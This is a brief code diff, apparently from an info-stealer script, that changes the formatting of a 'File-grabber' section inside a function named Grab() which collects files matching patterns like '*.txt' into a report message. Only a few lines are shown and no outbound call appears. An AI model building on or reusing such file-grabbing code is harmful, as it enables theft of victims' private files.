@@ -46,7 +46,7 @@ def Grab():
             pass
         try:
             Log("===========File-grabber===========")
-            msgInfo +="\n\n\n**📁File-grabber📁**"
+            msgInfo +="\n\n\n<b>📁File-grabber📁</b>"
 
             filesGrab = [
                 ["**\*.txt", 0],
